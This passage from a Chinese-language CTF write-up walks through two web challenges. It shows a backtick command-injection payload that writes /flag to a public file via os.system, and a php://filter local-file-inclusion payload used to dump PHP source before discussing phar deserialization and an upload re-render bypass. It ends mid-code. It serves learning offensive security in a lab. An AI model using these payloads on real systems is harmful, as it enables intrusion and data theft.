class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">font = ImageFont.truetype(<span class="string">&#x27;static/generator/comic-sans.ttf&#x27;</span>, size=<span class="number">48</span>)</span><br><span class="line"></span><br><span class="line">outfile = sys.argv[<span class="number">1</span>]</span><br><span class="line">text = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(text) &gt; <span class="number">1000</span>: <span class="comment"># Too much text :generate:</span></span><br><span class="line">  text = <span class="string">&quot;Too long!&quot;</span></span><br><span class="line"></span><br><span class="line">width, height = <span class="number">512</span>, <span class="number">562</span></span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height), color=(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">canvas = ImageDraw.Draw(img)</span><br><span class="line">chunks = []</span><br><span class="line"></span><br><span class="line">chunk = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">  chunk += char</span><br><span class="line">  text_width, text_height = canvas.textsize(chunk, font=font)</span><br><span class="line">  <span class="keyword">if</span> text_width &gt;= (width-<span class="number">20</span>):</span><br><span class="line">    chunks.append(chunk[:-<span class="number">1</span>])</span><br><span class="line">    chunk = char</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(chunks) == <span class="number">0</span>:</span><br><span class="line">  chunks.append(chunk)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> chunks[-<span class="number">1</span>] != chunk:</span><br><span class="line">  chunks.append(chunk)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i,chunk <span class="keyword">in</span> <span class="built_in">enumerate</span>(chunks):</span><br><span class="line">  text_width, text_height = canvas.textsize(chunk, font=font)</span><br><span class="line">  x_pos = <span class="built_in">int</span>((width - text_width) / <span class="number">2</span>) + <span class="number">10</span></span><br><span class="line">  y_pos = <span class="number">15</span> + i * <span class="number">100</span></span><br><span class="line">  canvas.text((x_pos, y_pos), chunk, font=font, fill=<span class="string">&#x27;#000000&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> text: <span class="comment"># Don&#x27;t try and exfiltrate flags from here :generate:</span></span><br><span class="line">  img = Image.<span class="built_in">open</span>(<span class="string">&quot;static/generator/error.jpg&quot;</span>) </span><br><span class="line">  img.save(<span class="string">f&quot;static/images/<span class="subst">&#123;outfile&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  img2 = Image.<span class="built_in">open</span>(<span class="string">&quot;static/generator/hack.jpg&quot;</span>)</span><br><span class="line">  img.paste(img2, (<span class="number">50</span>, <span class="number">100</span>), img2.convert(<span class="string">&#x27;RGBA&#x27;</span>))</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">len</span>(chunks) &gt; <span class="number">1</span>:</span><br><span class="line">    img3 = Image.<span class="built_in">open</span>(<span class="string">&quot;static/generator/move.png&quot;</span>).convert(<span class="string">&#x27;RGBA&#x27;</span>)</span><br><span class="line">    img3.paste(img, (<span class="number">170</span>,<span class="number">42</span>), img.convert(<span class="string">&#x27;RGBA&#x27;</span>))</span><br><span class="line">    img3.save(<span class="string">f&quot;static/images/<span class="subst">&#123;outfile&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    img.save(<span class="string">f&quot;static/images/<span class="subst">&#123;outfile&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>u1s1附件的代码8成都是没用的…提炼一下关键部分</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/generate&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    <span class="keyword">global</span> clean</span><br><span class="line">    <span class="keyword">if</span> time.time() - clean &gt; <span class="number">60</span>:</span><br><span class="line">      os.system(<span class="string">&quot;rm static/images/*&quot;</span>)</span><br><span class="line">      clean = time.time()</span><br><span class="line">    data = request.form.getlist(<span class="string">&#x27;text&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    data = data.replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    data = data.replace(<span class="string">&quot;$&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    name = <span class="string">&quot;&quot;</span>.join(random.choices(chars,k=<span class="number">8</span>)) + <span class="string">&quot;.png&quot;</span></span><br><span class="line">    <span class="comment"># 执行一句命令行，用于run gene.py，其中参数data是我们可控的</span></span><br><span class="line">    os.system(<span class="string">f&quot;python3 gene.py <span class="subst">&#123;name&#125;</span> \&quot;<span class="subst">&#123;data&#125;</span>\&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;static&#x27;</span>, filename=<span class="string">&#x27;images/&#x27;</span> + name), code=<span class="number">301</span>)</span><br><span class="line">...</span><br><span class="line"><span class="comment"># gene.py</span></span><br><span class="line">...</span><br><span class="line">outfile = sys.argv[<span class="number">1</span>]</span><br><span class="line">text = sys.argv[<span class="number">2</span>]</span><br><span class="line"><span class="comment"># 接收两个命令行参数，outfile即为app.py里的name，text为app.py里的data，因此text是可控的</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> text: <span class="comment"># Don&#x27;t try and exfiltrate flags from here :generate:</span></span><br><span class="line">    <span class="comment"># 当text里有flag字符串的时候，打开error图片，保存一张图片</span></span><br><span class="line">  img = Image.<span class="built_in">open</span>(<span class="string">&quot;static/generator/error.jpg&quot;</span>) </span><br><span class="line">  img.save(<span class="string">f&quot;static/images/<span class="subst">&#123;outfile&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<p>先说答案：</p>
<ol>
<li><p>app.py里的命令执行，data是我们可控的，因此使用命令行内联执行（<code>$()</code>、<code>`` </code>（反引）），可以单独执行其中的语句，这里由于<code>$</code>被过滤，因此用反引即可</p>
</li>
<li><p>payload： <code>cat /flag &gt; static/images/1.txt</code>（两边要套上反引，md里的行内代码打不出来…）</p>
<p>作用：读取flag并重定向到static/images目录下的1.txt（因为本题没有回显，所以要重定向到文件，如果有vps的话直接发送的自己的vps，然后在自己vps上监听应该也是可以的）</p>
</li>
<li><p>直接访问<code>static/images/1.txt</code>，发现flag已经被带了出来</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211203092136247-16385161043596.png" alt=""></p>
</li>
</ol>
<p>flag：<code>flag&#123;fhfgufghui_ewftftdf_whfdweyidg_gafdhjasdh_eghfhef_rhgfjrikfu!!!!&#125;</code></p>
<p>所以本题gene.py那么多代码其实是唬人的…甚至连<code>if &quot;flag&quot; in text:</code>那个都是没有什么用的…我还在想怎么利用那些参数，怎么绕flag的时候，发现其实只要知道他在app.py里有个命令执行，在gene.py里会保存文件且知道路径就完事了，很离谱</p>
<h3 id="Imgbed"><a href="#Imgbed" class="headerlink" title="Imgbed"></a>Imgbed</h3><p>复现这题的时候环境已经关了…和出题人要了个docker自己跑</p>
<p>一开始给了个注册登录忘记密码</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211203111941306.png?80" alt="image-20211203111941306"></p>
<p>查了一圈没什么可以利用的，直接注册登录进去看看</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211203102947317.png?80" alt="image-20211203102947317"></p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211203103037760.png" alt="image-20211203103037760"></p>
<p>发现个奇怪的地方，他的简洁模式url是<code>/index.php?action=class.php</code>，画廊模式是<code>/gallery.php</code>，同时简洁模式下有个上传的地方，先怀疑一下文件上传</p>
<p>把action的参数改为/flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211203103305401.png?80" alt="image-20211203103305401"></p>
<p>可以看到<code>include()</code>函数已经出来了，说明存在文件包含漏洞</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211203103630245.png" alt="image-20211203103630245"></p>
<p>发现可以读<code>/etc/passwd</code>却读不了<code>/flag</code>，那就应该是被某种策略拦截了</p>
<p>参考1：<a target="_blank" rel="noopener" href="https://blackdn.github.io/2020/04/04/CTF-File-Inclusion-2020/">CTF-Web-php文件包含小结</a></p>
<p>参考2：<a target="_blank" rel="noopener" href="https://tr0jan.top/archives/19/">从CTF学习文件包含</a></p>
<p>参考3：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/linfangnan/p/13535097.html">CTF-Web:php伪协议</a></p>
<p><strong>payload1</strong>：<code>/index.php?action=php://filter/read=convert.base64-encode/resource=index.php</code></p>
<ul>
<li><p><code>php://filter/</code>是一种访问本地文件的协议</p>
</li>
<li><p><code>/read=convert.base64-encode/</code>表示读取方式是base64编码（若不编码，则会直接执行index.php）</p>
<blockquote>
<p>参考1：当它与包含函数（常为include()）结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行，从而实现任意文件读取。</p>
</blockquote>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211203105302809.png" alt="image-20211203105302809"></p>
<p>读出base64流后解密</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211203105427926.png" alt="image-20211203105427926"></p>
<p>我又得强推一波这个工具了：CyberChef，本地使用真的很方便，解密后index.php代码如下（简化了一些没用的）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])&amp;&amp;!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: index.php?action=class.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;!DOCTYPE html&gt;</span><br><span class="line">    &lt;html&gt;</span><br><span class="line">    	....<span class="comment">// 页面展示</span></span><br><span class="line">    &lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> FileList();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>index.php好像没什么用，继续把其他几个功能的源码读出来</p>
<p>class.php如下（同样简化掉没用的）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">...<span class="comment">// 配置变量信息</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ....<span class="comment">// 用户注册、登录等功能</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Image</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ....<span class="comment">// 数据库、图片操作</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ....<span class="comment">// 文件列表，提供一些增删查改的功能</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Gallery</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ....<span class="comment">// 画廊模式的增删查改</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_file_exist</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; !is_dir(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_file_size</span>(<span class="params"></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;KB&#x27;</span>, <span class="string">&#x27;MB&#x27;</span>, <span class="string">&#x27;GB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> round(<span class="variable">$size</span>, <span class="number">1</span>) . <span class="string">&#x27; &#x27;</span> . <span class="variable">$units</span>[<span class="variable">$i</span>];<span class="comment">#浮点数四舍五入,保留1位小数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete_file</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_file_contents</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这里面发现了几个关键函数：<code>file_exists</code>、<code>is_dir</code>、<code>unlink</code>、<code>file_get_contents</code>，均是可以触发phar反序列化的函数</p>
<blockquote>
<p>这里其实可以利用<code>delete_file()</code>里的<code>unlink()</code>函数，这个函数可以触发phar反序列化，<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web1%5DDropbox">参考题目</a>，不过参考题目里题目将File类的<code>get_file_contents()</code>名字设置为<code>close()</code>，使得可以通过别的类构造调用链，这道题看起来是没办法的</p>
</blockquote>
<p>上传图片时抓包，可以发现通过upload.php上传，把upload.php也拿下来看一眼</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sent&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file_array</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_location</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">    <span class="variable">$file_num</span> = sizeof(<span class="variable">$file_array</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$file_num</span>) &#123;</span><br><span class="line">        header(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$file_num</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$this_file_json_object</span> = <span class="variable">$file_array</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$this_file</span> = json_decode(<span class="variable">$this_file_json_object</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$this_file_name</span> = <span class="variable">$this_file</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$this_file_type</span> = <span class="variable">$this_file</span>[<span class="string">&quot;type&quot;</span>];</span><br><span class="line">        <span class="variable">$this_file_data</span> = <span class="variable">$this_file</span>[<span class="string">&quot;data&quot;</span>];</span><br><span class="line">        <span class="variable">$this_file_extension</span> = substr(<span class="variable">$this_file_name</span>, strrpos(<span class="variable">$this_file_name</span>, <span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (((<span class="variable">$this_file_extension</span> == <span class="string">&quot;jpg&quot;</span> || <span class="variable">$this_file_extension</span> == <span class="string">&quot;jpeg&quot;</span>) &amp;&amp; (<span class="variable">$this_file_type</span> == <span class="string">&quot;image/jpeg&quot;</span>)) || ((<span class="variable">$this_file_extension</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$this_file_type</span> == <span class="string">&quot;image/png&quot;</span>)) || ((<span class="variable">$this_file_extension</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$this_file_type</span> == <span class="string">&quot;image/gif&quot;</span>))) &#123;</span><br><span class="line">            <span class="variable">$this_file_name</span> = sha1(date(<span class="string">&#x27;YmdGHs&#x27;</span>) . substr(microtime(<span class="literal">true</span>), <span class="number">11</span>, <span class="number">4</span>) . <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="variable">$this_file_name</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$this_file_extension</span>;</span><br><span class="line">            <span class="variable">$this_file_save_path</span> = <span class="variable">$file_location</span> . <span class="variable">$this_file_name</span>;</span><br><span class="line">            <span class="variable">$this_file_decode_data</span> = base64_decode(<span class="variable">$this_file_data</span>);</span><br><span class="line">            file_put_contents(<span class="variable">$this_file_save_path</span>, <span class="variable">$this_file_decode_data</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$this_file_type</span> == <span class="string">&quot;image/jpeg&quot;</span>)&#123;</span><br><span class="line">                <span class="variable">$im</span> = @imagecreatefromjpeg(<span class="variable">$this_file_save_path</span>);</span><br><span class="line">                @unlink(<span class="variable">$this_file_save_path</span>);</span><br><span class="line">                imagejpeg(<span class="variable">$im</span>,<span class="variable">$this_file_save_path</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$this_file_type</span> == <span class="string">&quot;image/png&quot;</span>)&#123;</span><br><span class="line">                <span class="variable">$im</span> = @imagecreatefrompng(<span class="variable">$this_file_save_path</span>);</span><br><span class="line">                @unlink(<span class="variable">$this_file_save_path</span>);</span><br><span class="line">                imagepng(<span class="variable">$im</span>,<span class="variable">$this_file_save_path</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$this_file_type</span> == <span class="string">&quot;image/gif&quot;</span>)&#123;</span><br><span class="line">                <span class="variable">$im</span> = @imagecreatefromgif(<span class="variable">$this_file_save_path</span>);</span><br><span class="line">                @unlink(<span class="variable">$this_file_save_path</span>);</span><br><span class="line">                imagegif(<span class="variable">$im</span>,<span class="variable">$this_file_save_path</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$image</span> = <span class="keyword">new</span> Image();</span><br><span class="line">            <span class="variable">$image</span>-&gt;insert(<span class="variable">$this_file_name</span>);<span class="comment">#在数据库中保存文件名</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>比较明显的二次渲染了</p>
<p>二次渲染参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657">https://xz.aliyun.com/t/2657</a></p>
<p>代码很大一坨，简化一下（挑出我们想利用的部分）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sent&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file_array</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_location</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">    <span class="variable">$file_num</span> = sizeof(<span class="variable">$file_array</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$file_num</span>) &#123;</span><br><span class="line">        header(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$file_num</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$this_file_json_object</span> = <span class="variable">$file_array</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$this_file</span> = json_decode(<span class="variable">$this_file_json_object</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$this_file_name</span> = <span class="variable">$this_file</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$this_file_type</span> = <span class="variable">$this_file</span>[<span class="string">&quot;type&quot;</span>];</span><br><span class="line">        <span class="variable">$this_file_data</span> = <span class="variable">$this_file</span>[<span class="string">&quot;data&quot;</span>];</span><br><span class="line">        <span class="variable">$this_file_extension</span> = substr(<span class="variable">$this_file_name</span>, strrpos(<span class="variable">$this_file_name</span>, <span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 以上几行都是获取文件信息</span></span><br><span 